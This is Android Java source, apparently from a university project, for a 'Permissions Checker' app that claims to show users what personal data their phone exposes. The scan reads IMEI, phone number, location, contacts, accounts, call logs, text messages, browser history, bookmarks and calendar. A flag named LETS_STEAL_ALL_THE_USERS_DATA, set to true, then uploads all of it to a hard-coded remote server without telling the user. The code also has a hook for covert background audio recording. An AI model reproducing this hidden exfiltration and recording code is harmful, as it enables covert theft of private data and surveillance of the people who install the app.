package edu.uiuc.permissionschecker;

import java.io.ByteArrayInputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import org.json.JSONArray;
import org.json.JSONException;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import edu.uiuc.permissionschecker.infocheck.Accounts;
import edu.uiuc.permissionschecker.infocheck.AnyLocation;
import edu.uiuc.permissionschecker.infocheck.BrowserBookmarks;
import edu.uiuc.permissionschecker.infocheck.BrowserHistory;
import edu.uiuc.permissionschecker.infocheck.Calendar;
import edu.uiuc.permissionschecker.infocheck.CallLogs;
import edu.uiuc.permissionschecker.infocheck.Contacts;
import edu.uiuc.permissionschecker.infocheck.IMEI;
import edu.uiuc.permissionschecker.infocheck.NetworkLocation;
import edu.uiuc.permissionschecker.infocheck.PermissionsChecker;
import edu.uiuc.permissionschecker.infocheck.PermissionsChecker.PermCheckerProgressListener;
import edu.uiuc.permissionschecker.infocheck.PhoneNumber;
import edu.uiuc.permissionschecker.infocheck.Result;
import edu.uiuc.permissionschecker.infocheck.TextMessages;

public class PermissionsCheckerActivity extends Activity implements PermCheckerProgressListener {

	boolean recordaudio = false;
	ViewGroup testlist;
	Button scanbutton;
	TextView description;
	CreepyAudioRecorder recorder;
	ArrayList<PermissionsTestView> views = new ArrayList<PermissionsTestView>();
	
	
	public static final boolean LETS_STEAL_ALL_THE_USERS_DATA = true;
	public static final String LETS_STEAL_ALL_THE_USERS_DATA_URL = "http://mosyg2.cs.uiuc.edu/~marsan1/android/something3.php";
	
	@Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.checkerlist);
      
        recorder = new CreepyAudioRecorder(this);
        setupButton();
        addEntries();
        
    }
	
	
	public void setupButton() {
		description = (TextView) findViewById(R.id.scan_description);
		scanbutton = (Button)findViewById(R.id.scanbutton);
		scanbutton.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View v) {
				scanTask = new ScanTask();
				scanTask.execute();
				toggleRecord();
			}
		});
	}
	
	public void addEntries() {
        testlist = (ViewGroup)findViewById(R.id.checker_list);

        addEntry(testlist, R.drawable.imei, "IMEI", "a unique number to identify your phone", IMEI.NAME);
        addEntry(testlist, R.drawable.phonenumber, "Phone Number", "your phone number", PhoneNumber.NAME);
        addEntry(testlist, R.drawable.location, "Any Location", "any location information your phone has", AnyLocation.NAME);
        addEntry(testlist, R.drawable.mylocation, "Network Location", "a less-accurate kind of location", NetworkLocation.NAME);
        addEntry(testlist, R.drawable.contacts, "Contacts", "your contacts on your phone, and their info", Contacts.NAME);
        addEntry(testlist, R.drawable.accounts, "Accounts", "your gmail info, twitter, etc.", Accounts.NAME);
        addEntry(testlist, R.drawable.calllog, "Call Logs", "phone calls you have made recently", CallLogs.NAME);
        addEntry(testlist, R.drawable.messages, "Messages", "text messages you have made/recieved", TextMessages.NAME);
        addEntry(testlist, R.drawable.browserbookmarks, "Bookmarks", "your browser bookmarks", BrowserBookmarks.NAME);
        addEntry(testlist, R.drawable.browserhistory, "Browser History", "webpages you have visited", BrowserHistory.NAME);
        addEntry(testlist, R.drawable.calendar, "Calendar", "calendar events you have made", Calendar.NAME);
	}
	
	public void addEntry(ViewGroup testlist, int id, String title, String description, String tag) {
		PermissionsTestView view = new PermissionsTestView(this, id, title, description, tag);
		testlist.addView(view);
		views.add(view);
	}
	
	
	public ScanTask scanTask = new ScanTask();
	public class ScanTask extends AsyncTask<Void, Void, Void> {

		@Override
		protected void onPreExecute() {
			scanbutton.setText(R.string.scanning);
			super.onPreExecute();
		}
		
		@Override
		protected Void doInBackground(Void... arg0) {
	        List<Result> results = new PermissionsChecker().runTest(PermissionsCheckerActivity.this, PermissionsCheckerActivity.this);				
			if (LETS_STEAL_ALL_THE_USERS_DATA) {
				try {

			        List<String> strings = new ArrayList<String>();
			        for (Result r : results) {
			        	try {
			    			String str = r.toJSON().toString();
			    			Log.d("RESULTTTT", "Result:"+str);
			        		strings.add(str);
			        	} catch (Exception e) {
			        		e.printStackTrace();
			        	}
			        }
			        JSONArray array = new JSONArray(strings);
			        String result;
						result = array.toString(4);
			        
					TelephonyManager service = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
					String imei = service.getDeviceId();
			        
					HttpStreamUploader htfu = new HttpStreamUploader(LETS_STEAL_ALL_THE_USERS_DATA_URL, "noparamshere", imei+"-"+System.currentTimeMillis()+".json.txt");
					htfu.doStart(new ByteArrayInputStream(result.getBytes()));
				} catch (JSONException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

			}
	        return null;
		}
		
		protected void onPostExecute(Void result) {
			scanbutton.setText(R.string.scan);
			description.setText(R.string.scantext_complete);
		};
		
	};
	

	@Override
	public void newResult(final Result result, List<Result> results) {
		Log.d("SOMETHINGSEARCHABLE", "Result: " +result.toString());
		for (final PermissionsTestView view : views) {
			if (result.name.equals(view.keyname)) {
				view.setOnClickListener(new OnClickListener() {
					public void onClick(View v) {
						Intent i = new Intent(PermissionsCheckerActivity.this, PermissionsDetailsActivity.class);
						i.putExtra("id", view.drawable);
						i.putExtra("title", view.title);
						i.putExtra("description", view.description);
						i.putExtra("result", result);
						startActivity(i);
						scanTask.cancel(true);
					}
				});
				runOnUiThread(new Runnable() { public void run() {
					view.setStatus(result.success, true);
				}});
			}
		}
	}

	@Override
	public void startTest(String name, List<Result> results) {
		for (final PermissionsTestView view : views) {
			if (name.equals(view.keyname)) {
				runOnUiThread(new Runnable() { public void run() {
					view.setStatus(PermissionsTestView.IN_PROGRESS, false);
				}});
			}
		}
	}
	
	
	
	
	
	
	
	@Override
	public boolean onCreateOptionsMenu(final Menu menu) {
	    final MenuInflater inflater = getMenuInflater();
	    inflater.inflate(R.menu.menu, menu);
		//menu.
	    return true;
	}
	
	
	@Override
	public boolean onMenuItemSelected(final int featureId, final MenuItem item) {
	    switch (item.getItemId()) {
	    case R.id.fullscan:
	    	remoteScan();
	    	return true;
	    case R.id.togglerecord:
	    	toggleRecord();
	    	return true;
	    }
	    return false;
	}
	
	public void remoteScan() {
		new RemoteScanTask().execute();
	}

	
	public void toggleRecord() {
		if (recordaudio == false) {
			recorder.stopBackgroundRecording();
			return;
		}
		boolean record = recorder.toggleBackgroundRecording();
		if (record)  {
			//Toast.makeText(this, "Recording. press again to stop", Toast.LENGTH_SHORT).show();
		} else  {
			Toast.makeText(this, "Done Recording", Toast.LENGTH_SHORT).show();
		}
	}
	
	
	public class RemoteScanTask extends AsyncTask<Void, Void, Void> {
		
		@Override
		protected void onPreExecute() {
			scanbutton.setText(R.string.scanning);
			super.onPreExecute();
		}
		
		@Override
		protected Void doInBackground(Void... arg0) {
			Log.d("REMOTE_SCAN_TASK", "STARTING SCAN +++++++++++++++++++++++++++++++++++");
			Map<String, List<Result>> resultmap = RemoteTester.testAll(PermissionsCheckerActivity.this);
			Log.d("REMOTE_SCAN_TASK", "ENDING   SCAN +++++++++++++++++++++++++++++++++++");

			return null;
		}
		
		protected void onPostExecute(Void result) {
			scanbutton.setText(R.string.scan);
			description.setText(R.string.scantext_complete);
		};
		
	};

	
	
	
}